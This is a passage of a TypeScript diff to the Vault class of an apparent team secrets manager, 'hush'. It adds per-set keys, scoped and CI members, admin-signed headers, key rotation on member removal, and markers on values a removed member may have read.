       const wrap = this.data.dek.wraps[c.fp];
-      if (!wrap) continue;
-      return isAgeWrap(wrap)
-        ? unwrapDekWithAge(wrap.age, id.age!.identityPath)
-        : unwrapDek(wrap, { pub: id.pub!, priv: id.priv! });
+      if (wrap) return this.trustView(this.unwrap(wrap, id));
+    }
+    for (const [env, k] of Object.entries(this.data.setKeys ?? {})) {
+      for (const c of this.myCandidates(id)) {
+        const wrap = k.wraps[c.fp];
+        if (wrap) return this.trustView(this.unwrap(wrap, id), env);
+      }
     }
     throw new Error(`Your key is not a recipient of vault "${this.data.name}".`);
+  }
+
+  /**
+   * A restricted set's key without the trust check, for a merge or a review —
+   * never to open or seal a value in place. Null when this identity is not
+   * wrapped into that set.
+   */
+  setKeyForReview(id: Opener, env: string): Buffer | null {
+    const k = this.data.setKeys?.[env];
+    if (!k) return null;
+    for (const c of this.myCandidates(id)) {
+      const wrap = k.wraps[c.fp];
+      if (wrap) return this.unwrap(wrap, id);
+    }
+    return null;
+  }
+
+  /**
+   * Sign the header as it stands, as `id` — for a document assembled outside
+   * the usual edits (a merge). Refuses unless `id` is an admin whose signing
+   * key the vault lists.
+   */
+  signAs(id: Opener): void {
+    this.opener = id;
+    this.signIfNeeded();
+  }
+
+  /** The vault key without the trust check — for a full member's review only. */
+  dekForReview(id: Opener): Buffer {
+    const view = this.reviewView(id);
+    if (view.set) throw new Error(`You can read only some sets of vault "${this.data.name}", not its vault key.`);
+    return view.dek;
+  }
+
+  private unwrap(wrap: DekWrap, id: Opener): Buffer {
+    // An age wrap may be backed by a YubiKey or the Secure Enclave, so this
+    // line is where the human gets prompted to touch something.
+    return isAgeWrap(wrap) ? unwrapDekWithAge(wrap.age, id.age!.identityPath) : unwrapDek(wrap, { pub: id.pub!, priv: id.priv! });
   }
 
   /**
@@ -867,21 +410,56 @@ export class Vault {
       }
       this.data = fresh.data;
       this.dekCache = null;
-      // The copy on disk is someone else's write. Its key counts as checked
+      this.setKeyCache.clear();
+      // The copy on disk is someone else's write. Its keys count as checked
       // only if replaying a value onto it went through the trust check.
       this.trusted = fresh.trusted;
+      this.trustedSets = fresh.trustedSets;
     }
 
+    this.signIfNeeded();
     this.writeAtomically();
     this.journal = [];
     this.structural = false;
+  }
+
+  /**
+   * A v3 vault's header must carry a valid admin signature when it is written.
+   * Value edits leave the header alone, so the existing signature still holds;
+   * anything that changed who holds which key needs a fresh one, and only an
+   * admin — with the signing key the vault lists for them — can give it.
+   */
+  private signIfNeeded(): void {
+    if (!this.signed) return;
+    if (verifyHeader(this.data).ok) return;
+    const me = this.opener ? this.myRecipient(this.opener) : null;
+    if (!this.opener || !me || me[1].role !== "admin" || me[1].ci) {
+      throw new ValidationError(
+        `Only an admin can change who can read vault "${safeText(this.data.name, 64)}" — its members, its keys, ` +
+          `or who may read a set. Admins: ${this.adminNames().join(", ") || "none"}.`,
+      );
+    }
+    const signer = signerOf(this.opener, me[1], true);
+    if (!signer || !me[1].spk || encodeSpk(signer.spk) !== me[1].spk) {
+      throw new ValidationError(
+        `You are an admin of "${safeText(this.data.name, 64)}", but the signing key it lists for you is not this machine's. ` +
+          `Another admin can re-add you with the key \`hush id\` prints.`,
+      );
+    }
+    signHeader(this.data, me[0], signer);
+  }
+
+  private adminNames(): string[] {
+    return Object.values(this.data.recipients)
+      .filter((r) => r.role === "admin" && !r.ci)
+      .map((r) => safeText(r.name, 64) ?? "unknown");
   }
 
   private writeAtomically(): void {
     // A vault that now holds generation-bound values must not keep claiming to
     // be v1: an older hush reading it would fail those values with a bare AEAD
     // error instead of a clear "this build is too old" message.
-    if (Object.values(this.data.envs).some((m) => Object.values(m).some((e) => e.v === 2))) {
+    if (this.data.scheme === SCHEME && Object.values(this.data.envs).some((m) => Object.values(m).some((e) => e.v === 2))) {
       this.data.scheme = SCHEME_V2;
     }
     const body = JSON.stringify(this.data, null, 2) + "\n";
@@ -910,7 +488,8 @@ export class Vault {
   // ------------------------------------------------------------ key access
 
   /**
-   * Unwrap the DEK with the caller's identity. Throws if they were revoked.
+   * Unwrap the vault key with the caller's identity. Throws if they were
+   * revoked, or are a scoped member (who holds set keys, not this one).
    * Membership is re-checked on every call, before the cache is consulted.
    */
   dek(id: Opener): Buffer {
@@ -918,12 +497,7 @@ export class Vault {
       const wrap = this.data.dek.wraps[c.fp];
       if (!wrap) continue;
       if (this.dekCache?.fp === c.fp) return this.dekCache.dek;
-
-      // An age wrap may be backed by a YubiKey or the Secure Enclave, so this
-      // line is where the human gets prompted to touch something.
-      const dek = isAgeWrap(wrap)
-        ? unwrapDekWithAge(wrap.age, id.age!.identityPath)
-        : unwrapDek(wrap, { pub: id.pub!, priv: id.priv! });
+      const dek = this.unwrap(wrap, id);
 
       // Unwrapping proves the key was wrapped *to* you, not *by* a member: a
       // non-member can wrap a key of their choosing to every public key in the
@@ -937,27 +511,87 @@ export class Vault {
       this.dekCache = { fp: c.fp, dek };
       return dek;
     }
+    const scoped = this.myRecipient(id)?.[1].sets;
     throw new Error(
-      `Your key is not a recipient of vault "${this.data.name}".\n` +
-        `Ask an admin to run:  hush team add <you> ${describeOpener(id)}`,
+      scoped
+        ? `You can read only these sets of vault "${this.data.name}": ${scoped.join(", ") || "none"}.`
+        : `Your key is not a recipient of vault "${this.data.name}".\n` +
+            `Ask an admin to run:  hush team add <you> ${describeOpener(id)}`,
     );
   }
 
+  /** A restricted set's own key, checked the same way the vault key is. */
+  private setKey(id: Opener, env: string): Buffer {
+    const k = this.data.setKeys?.[env];
+    if (!k) throw new Error(`"${env}" has no key of its own.`);
+    for (const c of this.myCandidates(id)) {
+      const wrap = k.wraps[c.fp];
+      if (!wrap) continue;
+      const cached = this.setKeyCache.get(env);
+      if (cached?.fp === c.fp) return cached.key;
+      const key = this.unwrap(wrap, id);
+      const t = this.trustedSets.get(env);
+      const known = t?.generation === k.generation && t.key.equals(key);
+      if (trustHook && !known) trustHook.verify(this.trustView(key, env));
+      this.trustedSets.set(env, { generation: k.generation, key });
+      this.setKeyCache.set(env, { fp: c.fp, key });
+      return key;
+    }
+    throw new ValidationError(
+      `You are not a member of set "${env}" in vault "${safeText(this.data.name, 64)}". ` +
+        `An admin can add you: hush team add <you> <your key> --sets ${env}`,
+    );
+  }
+
+  /** The key a set's values are sealed under, and its generation. */
+  private keyFor(id: Opener, env: string): Buffer {
+    return this.isRestricted(env) ? this.setKey(id, env) : this.dek(id);
+  }
+
+  private genFor(env: string): number {
+    return this.data.setKeys?.[env]?.generation ?? this.data.dek.generation;
+  }
+
+  /** The set has a key of its own (hush/v3). */
+  isRestricted(env: string): boolean {
+    return Boolean(this.data.setKeys?.[env]);
+  }
+
+  /** Can this identity open anything in this vault at all? */
   canRead(id: Opener): boolean {
-    return this.myCandidates(id).some((c) => Boolean(this.data.dek.wraps[c.fp]));
+    const cands = this.myCandidates(id);
+    if (cands.some((c) => Boolean(this.data.dek.wraps[c.fp]))) return true;
+    return Object.values(this.data.setKeys ?? {}).some((k) => cands.some((c) => Boolean(k.wraps[c.fp])));
+  }
+
+  /** Can this identity open this particular set? */
+  canReadSet(id: Opener, env: string): boolean {
+    const cands = this.myCandidates(id);
+    const wraps = this.data.setKeys?.[env]?.wraps ?? this.data.dek.wraps;
+    return cands.some((c) => Boolean(wraps[c.fp]));
   }
 
   meFingerprint(id: Opener): string {
-    const hit = this.myCandidates(id).find((c) => this.data.dek.wraps[c.fp]);
-    return hit?.fp ?? "";
+    return this.myRecipient(id)?.[0] ?? "";
+  }
+
+  private myRecipient(id: Opener): [string, Recipient] | null {
+    for (const c of this.myCandidates(id)) {
+      const r = this.data.recipients[c.fp];
+      if (r) return [c.fp, r];
+    }
+    return null;
   }
 
   memberName(id: Opener): string {
-    for (const c of this.myCandidates(id)) {
-      const r = this.data.recipients[c.fp];
-      if (r) return safeText(r.name, 64) ?? "unknown";
-    }
-    return "unknown";
+    const me = this.myRecipient(id);
+    return me ? (safeText(me[1].name, 64) ?? "unknown") : "unknown";
+  }
+
+  /** Is this identity an admin who could sign a change to the header? */
+  isAdmin(id: Opener): boolean {
+    const me = this.myRecipient(id);
+    return Boolean(me && me[1].role === "admin" && !me[1].ci && !me[1].sets);
   }
 
   // -------------------------------------------------------------- secrets
@@ -999,7 +633,7 @@ export class Vault {
   }
 
   /** Key names only. Safe to show an agent. */
-  list(env: string): { key: string; updatedAt: string; updatedBy: string; note?: string }[] {
+  list(env: string): { key: string; updatedAt: string; updatedBy: string; note?: string; exposed?: string[] }[] {
     const slot = this.data.envs[env] ?? {};
     return Object.entries(slot)
       // Sanitised here rather than at each call site: every renderer reads this,
@@ -1009,17 +643,11 @@ export class Vault {
         updatedAt: safeText(e.updatedAt, 32) ?? "",
         updatedBy: safeText(e.updatedBy, 64) ?? "unknown",
         note: safeText(e.note),
+        ...(e.exposed?.length ? { exposed: e.exposed.map((n) => safeText(n, 64) ?? "unknown") } : {}),
       }))
       .sort((a, b) => a.key.localeCompare(b.key));
   }
 
-  /**
-   * Create an environment with nothing in it yet.
-   *
-   * A named set with no keys is a perfectly reasonable thing to make first and
-   * fill in afterwards, and `ensureEnv` is private because callers should not
-   * be reaching into the value map.
-   */
   /**
    * Declare that this change cannot be replayed onto a newer copy.
    *
@@ -1031,9 +659,31 @@ export class Vault {
     this.structural = true;
   }
 
+  /** Create an environment with nothing in it yet. */
   ensureEnvExists(env: string): void {
     assertScopeName(env);
     this.ensureEnv(env);
+  }
+
+  /**
+   * Remove a whole set. A restricted set takes its key with it, and scoped
+   * members lose it from their list — which changes the header, so in a v3
+   * vault only an admin can do it.
+   */
+  removeSet(id: Opener | null, env: string): void {
+    this.opener = id ?? this.opener;
+    this.structural = true;
+    delete this.data.envs[env];
+    if (this.data.meta) delete this.data.meta[env];
+    if (this.data.setKeys?.[env]) {
+      delete this.data.setKeys[env];
+      if (!Object.keys(this.data.setKeys).length) delete this.data.setKeys;
+    }
+    for (const r of Object.values(this.data.recipients)) {
+      if (r.sets?.includes(env)) r.sets = r.sets.filter((s) => s !== env);
+    }
+    this.trustedSets.delete(env);
+    this.setKeyCache.delete(env);
   }
 
   /** What this environment is called and what it is for. Never throws. */
@@ -1058,10 +708,15 @@ export class Vault {
     whenToUse?: string;
     source?: string;
     keys: string[];
+    /** Has a key of its own, so scoped members can be given it (or kept out). */
+    restricted: boolean;
+    /** Who can read it, when restricted: every full member plus the scoped members given it. */
+    readers?: string[];
   }[] {
     return this.envNames()
       .map((name) => {
         const meta = this.envMeta(name);
+        const k = this.data.setKeys?.[name];
         return {
           // Scrubbed for the same reason a key name is: this is the shape every
           // renderer reads, and a name that arrived in a hand-edited or
@@ -1074,7 +729,15 @@ export class Vault {
           source: safeText(meta.source, 200),
           keys: Object.keys(this.data.envs[name] ?? {})
             .sort()
-            .map((k) => safeText(k, 64) ?? "<unprintable>"),
+            .map((key) => safeText(key, 64) ?? "<unprintable>"),
+          restricted: Boolean(k),
+          ...(k
+            ? {
+                readers: Object.keys(k.wraps)
+                  .map((fp) => safeText(this.data.recipients[fp]?.name, 64) ?? "unknown")
+                  .sort(),
+              }
+            : {}),
         };
       })
       .sort((a, b) => a.label.localeCompare(b.label));
@@ -1120,13 +783,13 @@ export class Vault {
    * data key and wanted quiet access. hush never writes one.
    */
   unlistedWraps(): string[] {
-    return Object.keys(this.data.dek.wraps)
-      .filter((fp) => !this.data.recipients[fp])
-      .sort();
+    const fps = new Set(Object.keys(this.data.dek.wraps));
+    for (const k of Object.values(this.data.setKeys ?? {})) for (const fp of Object.keys(k.wraps)) fps.add(fp);
+    return [...fps].filter((fp) => !this.data.recipients[fp]).sort();
   }
 
   /**
-   * Values sealed under a data key older than the vault's current one.
+   * Values sealed under a data key older than the one their set uses now.
    *
    * `rotate()` and `removeRecipient()` re-seal everything, so in a vault hush
    * wrote this is always empty. It will not be empty if a rotation was
@@ -1136,9 +799,9 @@ export class Vault {
    * only looks complete.
    */
   staleValues(): { env: string; key: string; gen: number }[] {
-    const current = this.data.dek.generation;
     const out: { env: string; key: string; gen: number }[] = [];
     for (const [env, values] of Object.entries(this.data.envs)) {
+      const current = this.genFor(env);
       for (const [key, entry] of Object.entries(values)) {
         if (entry.gen < current) out.push({ env, key, gen: entry.gen });
       }
@@ -1155,28 +818,40 @@ export class Vault {
     return entry.v === 2 ? entry.gen : undefined;
   }
 
+  private sealEntry(key: Buffer, env: string, name: string, value: string, prev?: Partial<SecretEntry>): SecretEntry {
+    const gen = this.genFor(env);
+    return {
+      ...sealValue(key, env, name, value, gen),
+      gen,
+      v: 2,
+      updatedAt: prev?.updatedAt ?? new Date().toISOString(),
+      updatedBy: prev?.updatedBy ?? "unknown",
+      ...(prev?.note ? { note: prev.note } : {}),
+      ...(prev?.exposed?.length ? { exposed: prev.exposed } : {}),
+    };
+  }
+
   set(id: Opener, env: string, key: string, value: string, note?: string): void {
     assertScopeName(env);
     assertKeyName(key);
     assertValueSize(key, value);
     this.opener = id;
     this.journal.push({ op: "set", env, key, value, ...(note ? { note } : {}) });
-    const dek = this.dek(id);
+    const k = this.keyFor(id, env);
     const slot = this.ensureEnv(env);
-    slot[key] = {
-      ...sealValue(dek, env, key, value, this.data.dek.generation),
-      gen: this.data.dek.generation,
-      v: 2,
+    // A new value is not the one someone removed could read: the exposure
+    // marker (F-6) goes with the old value.
+    slot[key] = this.sealEntry(k, env, key, value, {
       updatedAt: new Date().toISOString(),
       updatedBy: this.memberName(id),
-      ...(trimNote(note) ? { note: trimNote(note) } : {}),
-    };
+      note: trimNote(note),
+    });
   }
 
   get(id: Opener, env: string, key: string): string {
     const entry = this.data.envs[env]?.[key];
     if (!entry) throw new ValidationError(`No secret "${key}" in env "${env}".`);
-    return openValue(this.dek(id), env, key, entry, this.aadGen(entry));
+    return openValue(this.keyFor(id, env), env, key, entry, this.aadGen(entry));
   }
 
   /**
@@ -1184,8 +859,9 @@ export class Vault {
    *
    * Not a map-key edit: the environment name is bound into every value's AAD —
    * the thing that stops a staging URL being pasted into the prod slot — so the
-   * value is opened and re-sealed under its new home. That also means this needs
-   * an identity, and that it is not mergeable with a concurrent write.
+   * value is opened and re-sealed under its new home (and its key, when the
+   * two sets have different ones). That also means this needs an identity, and
+   * that it is not mergeable with a concurrent write.
    *
    * It exists because the state everybody actually starts in is one big pile of
    * keys under "default", and carving that into named sets is the whole point of
@@ -1206,16 +882,9 @@ export class Vault {
     this.structural = true;
     this.opener = id;
 
-    const value = openValue(this.dek(id), from, key, entry, this.aadGen(entry));
-    const slot = this.ensureEnv(to);
-    slot[key] = {
-      ...sealValue(this.dek(id), to, key, value, this.data.dek.generation),
-      gen: this.data.dek.generation,
-      v: 2,
-      updatedAt: entry.updatedAt,
-      updatedBy: entry.updatedBy,
-      ...(entry.note ? { note: entry.note } : {}),
-    };
+    const value = openValue(this.keyFor(id, from), from, key, entry, this.aadGen(entry));
+    this.ensureEnv(to);
+    this.data.envs[to][key] = this.sealEntry(this.keyFor(id, to), to, key, value, entry);
     delete this.data.envs[from][key];
   }
 
@@ -1247,62 +916,188 @@ export class Vault {
 
   /** Decrypt an entire environment. Only ever called in-process, never written out by default. */
   materialize(id: Opener, env: string): Record<string, string> {
-    const dek = this.dek(id);
+    const entries = Object.entries(this.data.envs[env] ?? {});
+    if (!entries.length) return {};
+    const k = this.keyFor(id, env);
     const out: Record<string, string> = {};
-    for (const [key, entry] of Object.entries(this.data.envs[env] ?? {})) {
-      out[key] = openValue(dek, env, key, entry, this.aadGen(entry));
-    }
+    for (const [key, entry] of entries) out[key] = openValue(k, env, key, entry, this.aadGen(entry));
     return out;
   }
 
   // --------------------------------------------------------------- members
 
-  addRecipient(id: Opener, name: string, pkString: string, role: "admin" | "member" = "member"): string {
-    const dek = this.dek(id);
-    this.structural = true;
+  /**
+   * In a signed (v3) vault, only an admin may change who holds which key. A v2
+   * vault an admin touches this way is signed on the spot — the upgrade that
+   * makes their role mean something.
+   */
+  private beginHeaderChange(id: Opener): void {
+    // Every key this identity holds is unwrapped — and so checked against what
+    // this machine accepted — *before* the header changes. Checked afterwards,
+    // the check would see this very edit and call it unsigned.
+    if (this.myCandidates(id).some((c) => this.data.dek.wraps[c.fp])) this.dek(id);
+    for (const env of Object.keys(this.data.setKeys ?? {})) if (this.canReadSet(id, env)) this.setKey(id, env);
     this.opener = id;
-    const now = new Date().toISOString();
+    this.structural = true;
+    if (this.signed) {
+      if (!this.isAdmin(id)) {
+        throw new ValidationError(
+          `Only an admin can change who can read vault "${safeText(this.data.name, 64)}". ` +
+            `Admins: ${this.adminNames().join(", ") || "none"}.`,
+        );
+      }
+      return;
+    }
+    const me = this.myRecipient(id);
+    if (me && this.isAdmin(id) && signerOf(id, me[1])) this.upgradeToV3(id);
+  }
+
+  /**
+   * Sign this vault (hush/v3). The opener must be a full admin; their own
+   * signing key is recorded, and a commitment to every data key is added so
+   * the signature covers which keys members should find.
+   */
+  upgradeToV3(id: Opener): void {
+    if (this.signed) return;
+    const me = this.myRecipient(id);
+    if (!me || me[1].role !== "admin" || me[1].sets) {
+      throw new ValidationError(`Only an admin can sign vault "${safeText(this.data.name, 64)}".`);
+    }
+    const signer = signerOf(id, me[1], true);
+    if (!signer) throw new ValidationError("This identity has no signing key.");
+    this.opener = id;
+    this.structural = true;
+    const dek = this.dek(id);
+    this.data.dek.commit = vaultKeyCommit(dek, this.data.id, this.data.dek.generation);
+    me[1].spk = encodeSpk(signer.spk);
+    this.data.scheme = SCHEME_V3;
+  }
+
+  /**
+   * Add a member, or change one: a new key for an existing name is refused, but
+   * the same key again can add a signing key, change a role, or grant sets.
+   *
+   * `sets` makes a *scoped* member: no vault key, only the keys of those sets
+   * (each becomes restricted, with a key of its own, if it was not already).
+   * `ci` marks a machine identity: always scoped, never an admin.
+   */
+  addRecipient(
+    id: Opener,
+    name: string,
+    pkString: string,
+    role: "admin" | "member" = "member",
+    opts: { sets?: string[]; ci?: boolean; spk?: string } = {},
+  ): string {
+    const parsed = parseMemberKey(pkString);
+    // Your own hardware key, added by you (the `hush secure --hardware` step):
+    // it cannot sign, so it carries this machine's signing key, which is what
+    // will sign for it once the software key is retired.
+    const ownAge = parsed.type === "age" && Boolean(id.age?.recipients.includes(parsed.pk));
+    const spk =
+      opts.spk ?? parsed.spk ?? (ownAge && role === "admin" ? encodeSpk(signerFor({ age: id.age }, true)!.spk) : undefined);
+    if (spk) decodeSpk(spk);
+    const scoped = Boolean(opts.sets?.length);
+    if (role === "admin" && (scoped || opts.ci)) {
+      throw new ValidationError("An admin can read every set, and a CI identity is never an admin.");
+    }
+    if (opts.ci && !scoped) throw new ValidationError("A CI identity is given specific sets: --sets ci,staging.");
 
     // Names must be unique, because `hush team rm <name>` is how access is
     // revoked. Two members called "bob" meant removing one, being told it
     // worked, and leaving the other with full access — the exact failure
     // revocation exists to prevent.
-    const incomingFp = isAgeRecipient(pkString)
-      ? ageFingerprint(pkString.trim())
-      : fingerprint(decodePub(pkString));
-    const clash = Object.entries(this.data.recipients).find(
-      ([fp, r]) => r.name === name && fp !== incomingFp,
-    );
+    const clash = Object.entries(this.data.recipients).find(([fp, r]) => r.name === name && fp !== parsed.fp);
     if (clash) {
       throw new ValidationError(
         `"${name}" is already a member with a different key (${clash[1].pk.slice(0, 20)}…). ` +
           `Pick a distinct name, or remove the existing one first.`,
       );
     }
-
-    // An age recipient may be a hardware key; hush never learns which.
-    if (isAgeRecipient(pkString)) {
-      const recipient = pkString.trim();
-      const fp = ageFingerprint(recipient);
-      this.data.recipients[fp] = { name, pk: recipient, role, addedAt: now, type: "age" };
-      this.data.dek.wraps[fp] = { age: wrapDekWithAge(dek, recipient) };
-      return fp;
+    const existing = this.data.recipients[parsed.fp];
+    if (existing && scoped && !existing.sets) {
+      throw new ValidationError(`${existing.name} is already a full member and can read every set.`);
+    }
+    if (existing?.sets && !scoped) {
+      throw new ValidationError(
+        `${existing.name} is a scoped member. To make them a full member, remove them and add them again without --sets.`,
+      );
     }
 
-    const pub = decodePub(pkString);
-    const fp = fingerprint(pub);
-    this.data.recipients[fp] = { name, pk: encodePub(pub), role, addedAt: now, type: "x25519" };
-    this.data.dek.wraps[fp] = wrapDek(dek, pub);
-    return fp;
+    this.beginHeaderChange(id);
+    const now = new Date().toISOString();
+    const recipient: Recipient = {
+      name,
+      pk: parsed.pk,
+      role,
+      addedAt: existing?.addedAt ?? now,
+      type: parsed.type,
+      ...(spk ? { spk } : existing?.spk ? { spk: existing.spk } : {}),
+      ...(opts.ci || existing?.ci ? { ci: true as const } : {}),
+    };
+
+    if (scoped) {
+      if (!this.signed) {
+        throw new ValidationError(
+          "Giving someone only some sets needs a signed vault — each of those sets gets a key of its own, and " +
+            "an admin signs who holds it. Run `hush team sign` first (an admin).",
+        );
+      }
+      const sets = [...new Set([...(existing?.sets ?? []), ...opts.sets!])].sort();
+      for (const env of opts.sets!) {
+        assertScopeName(env);
+        if (!this.data.envs[env]) throw new ValidationError(`No set called "${env}" in this vault.`);
+      }
+      recipient.sets = sets;
+      this.data.recipients[parsed.fp] = recipient;
+      for (const env of opts.sets!) {
+        this.restrict(id, env);
+        const key = this.setKey(id, env);
+        this.data.setKeys![env].wraps[parsed.fp] = wrapFor(key, recipient);
+      }
+      return parsed.fp;
+    }
+
+    const dek = this.dek(id);
+    this.data.recipients[parsed.fp] = recipient;
+    this.data.dek.wraps[parsed.fp] = wrapFor(dek, recipient);
+    // A full member reads every set, including those with keys of their own.
+    for (const env of Object.keys(this.data.setKeys ?? {})) {
+      this.data.setKeys![env].wraps[parsed.fp] = wrapFor(this.setKey(id, env), recipient);
+    }
+    return parsed.fp;
   }
 
   /**
-   * Remove a member and mint a fresh DEK generation, re-sealing every value.
-   * Past values they already read stay compromised — rotate those upstream.
+   * Give a set a key of its own, if it does not have one: its values are
+   * re-sealed under it, and every full member is wrapped in, so nothing
+   * changes for them. Scoped members can then be given it one at a time.
    */
-  removeRecipient(id: Opener, name: string): { removed: Recipient; reEncrypted: number } {
-    this.structural = true;
+  restrict(id: Opener, env: string): void {
+    if (this.data.setKeys?.[env]) return;
+    if (!this.signed) throw new ValidationError("A set with a key of its own needs a signed vault: hush team sign.");
     this.opener = id;
+    this.structural = true;
+    const values = this.materialize(id, env);
+    const key = newDek();
+    const generation = 1;
+    const wraps: Record<string, DekWrap> = {};
+    for (const [fp, r] of Object.entries(this.data.recipients)) if (!r.sets) wraps[fp] = wrapFor(key, r);
+    this.data.setKeys ??= {};
+    this.data.setKeys[env] = { generation, wraps, commit: setKeyCommit(key, this.data.id, env, generation) };
+    this.trustedSets.set(env, { generation, key });
+    this.setKeyCache.delete(env);
+    for (const [name, value] of Object.entries(values)) {
+      this.data.envs[env][name] = this.sealEntry(key, env, name, value, this.data.envs[env][name]);
+    }
+  }
+
+  /**
+   * Remove a member and mint fresh keys for everything they could read,
+   * re-sealing it. Past values they already read stay compromised — rotate
+   * those upstream; every value they could read is marked exposed (F-6)
+   * until it is set again.
+   */
+  removeRecipient(id: Opener, name: string): { removed: Recipient; reEncrypted: number; exposed: number } {
     // Remove *every* entry with this name. New vaults cannot contain duplicates,
     // but one written before that rule could, and revoking half of someone is
     // worse than refusing outright.
@@ -1325,25 +1120,95 @@ export class Vault {
       }
     }
 
+    this.beginHeaderChange(id);
+    if (this.signed) {
+      // Someone has to be able to sign what is left, and it has to be whoever
+      // is doing this: the save that follows needs their signature.
+      const signers = Object.entries(this.data.recipients).filter(
+        ([fp, r]) => !doomed.has(fp) && r.role === "admin" && !r.ci && !r.sets && r.spk,
+      );
+      if (!signers.length) {
+        throw new ValidationError(
+          `Removing "${name}" would leave no admin who can sign changes to this vault. Make someone else an admin first.`,
+        );
+      }
+      if (!signers.some(([fp]) => mine.some((c) => c.fp === fp))) {
+        throw new ValidationError(
+          `After removing "${name}", none of your keys is an admin that can sign. ` +
+            `Add your other key as an admin first (hush team add <name> <key> --role admin).`,
+        );
+      }
+    }
+
+    // What they could read, decided before anything changes.
+    const heldVaultKey = matches.some(([fp]) => this.data.dek.wraps[fp]);
+    const heldSets = Object.entries(this.data.setKeys ?? {})
+      .filter(([, k]) => matches.some(([fp]) => k.wraps[fp]))
+      .map(([env]) => env);
+    const readable = [
+      ...(heldVaultKey ? this.envNames().filter((e) => !this.isRestricted(e)) : []),
+      ...heldSets,
+    ];
+
     // Decrypt everything first: if that fails we have changed nothing.
-    const plaintext = this.snapshot(id);
+    const openPlain = heldVaultKey ? this.snapshotOpen(id) : {};
+    const setPlain: Record<string, Record<string, string>> = {};
+    for (const env of heldSets) setPlain[env] = this.materialize(id, env);
 
-    // Re-seal against a recipient list that excludes them, but only commit the
-    // deletion once it worked — otherwise a failing age plugin could leave the
-    // vault with a member dropped and the key not actually rotated.
-    const keptRecipients = { ...this.data.recipients };
-    for (const [f] of matches) delete keptRecipients[f];
-
-    const previous = { recipients: this.data.recipients, dek: this.data.dek };
-    this.data.recipients = keptRecipients;
+    const previous = JSON.parse(JSON.stringify(this.data)) as VaultFile;
     try {
-      const reEncrypted = this.reseal(plaintext);
-      return { removed, reEncrypted };
+      for (const [f] of matches) {
+        delete this.data.recipients[f];
+        delete this.data.dek.wraps[f];
+        for (const k of Object.values(this.data.setKeys ?? {})) delete k.wraps[f];
+      }
+      let reEncrypted = 0;
+      if (heldVaultKey) reEncrypted += this.reseal(openPlain);
+      for (const env of heldSets) reEncrypted += this.resealSet(env, setPlain[env]);
+      let exposed = 0;
+      for (const env of readable) {
+        for (const entry of Object.values(this.data.envs[env] ?? {})) {
+          entry.exposed = [...new Set([...(entry.exposed ?? []), removed.name])];
+          exposed++;
+        }
+      }
+      return { removed, reEncrypted, exposed };
     } catch (e) {
-      this.data.recipients = previous.recipients;
-      this.data.dek = previous.dek;
+      // A failing age plugin must not leave a member dropped and the key not
+      // actually rotated.
+      this.data = previous;
       throw e;
     }
+  }
+
+  /**
+   * Take some sets away from a scoped member, rotating those sets' keys. With
+   * none left they are removed from the vault altogether.
+   */
+  removeFromSets(id: Opener, name: string, sets: string[]): { remaining: string[]; reEncrypted: number } {
+    const match = Object.entries(this.data.recipients).find(([, r]) => r.name === name);
+    if (!match) throw new ValidationError(`No member named "${name}".`);
+    const [fp, r] = match;
+    if (!r.sets) {
+      throw new ValidationError(
+        `${r.name} is a full member and reads every set. Remove them (hush team rm ${r.name}) and add them back with --sets.`,
+      );
+    }
+    for (const env of sets) if (!r.sets.includes(env)) throw new ValidationError(`${r.name} cannot read "${env}" now.`);
+    this.beginHeaderChange(id);
+    const plain: Record<string, Record<string, string>> = {};
+    for (const env of sets) plain[env] = this.materialize(id, env);
+    let reEncrypted = 0;
+    for (const env of sets) {
+      delete this.data.setKeys![env].wraps[fp];
+      reEncrypted += this.resealSet(env, plain[env]);
+      for (const entry of Object.values(this.data.envs[env] ?? {})) {
+        entry.exposed = [...new Set([...(entry.exposed ?? []), r.name])];
+      }
+    }
+    r.sets = r.sets.filter((s) => !sets.includes(s));
+    if (!r.sets.length) delete this.data.recipients[fp];
+    return { remaining: r.sets, reEncrypted };
   }
 
   /**
@@ -1353,7 +1218,8 @@ export class Vault {
    * being pasted into the prod slot — so a rename is not a map-key edit. Every
    * value has to be opened and re-sealed under the new name, which is why this
    * needs an identity and why it is structural: it cannot be merged with a
-   * concurrent write.
+   * concurrent write. A restricted set keeps its key, whose commitment names
+   * the set, so it is re-committed; scoped members keep it under its new name.
    */
   renameEnv(id: Opener, from: string, to: string): { moved: number } {
     assertScopeName(from);
@@ -1366,28 +1232,34 @@ export class Vault {
       );
     }
 
+    const restricted = this.isRestricted(from);
+    if (restricted) this.beginHeaderChange(id);
     this.structural = true;
     this.opener = id;
 
     // Open everything first: if any of it fails we have changed nothing.
     const plaintext = this.materialize(id, from);
     const previous = this.data.envs[from];
+    const key = this.keyFor(id, from);
 
-    const moved: Record<string, SecretEntry> = {};
-    const dek = this.dek(id);
-    for (const [key, value] of Object.entries(plaintext)) {
-      const prev = previous[key];
-      moved[key] = {
-        ...sealValue(dek, to, key, value, this.data.dek.generation),
-        gen: this.data.dek.generation,
-        v: 2,
-        updatedAt: prev.updatedAt,
-        updatedBy: prev.updatedBy,
-        ...(prev.note ? { note: prev.note } : {}),
-      };
+    if (restricted) {
+      const k = this.data.setKeys![from];
+      this.data.setKeys![to] = { ...k, commit: setKeyCommit(key, this.data.id, to, k.generation) };
+      delete this.data.setKeys![from];
+      const t = this.trustedSets.get(from);
+      if (t) this.trustedSets.set(to, t);
+      this.trustedSets.delete(from);
+      this.setKeyCache.delete(from);
+      for (const r of Object.values(this.data.recipients)) {
+        if (r.sets?.includes(from)) r.sets = r.sets.map((s) => (s === from ? to : s)).sort();
+      }
     }
 
+    const moved: Record<string, SecretEntry> = {};
     this.data.envs[to] = moved;
+    for (const [name, value] of Object.entries(plaintext)) {
+      moved[name] = this.sealEntry(key, to, name, value, previous[name]);
+    }
     delete this.data.envs[from];
 
     if (this.data.meta?.[from]) {
@@ -1397,43 +1269,36 @@ export class Vault {
     return { moved: Object.keys(moved).length };
   }
 
-  /** New DEK generation for every remaining recipient. Used by rotate and by removal. */
+  /** New keys for everything this identity can read. Used by `hush rotate`. */
   rotate(id: Opener): number {
-    this.structural = true;
-    this.opener = id;
-    const plaintext = this.snapshot(id);
-    return this.reseal(plaintext);
+    this.beginHeaderChange(id);
+    const plaintext = this.snapshotOpen(id);
+    const sets: Record<string, Record<string, string>> = {};
+    for (const env of Object.keys(this.data.setKeys ?? {})) sets[env] = this.materialize(id, env);
+    let n = this.reseal(plaintext);
+    for (const [env, values] of Object.entries(sets)) n += this.resealSet(env, values);
+    return n;
   }
 
-  private snapshot(id: Opener): Record<string, Record<string, string>> {
+  /** Every set sealed under the vault key, decrypted. */
+  private snapshotOpen(id: Opener): Record<string, Record<string, string>> {
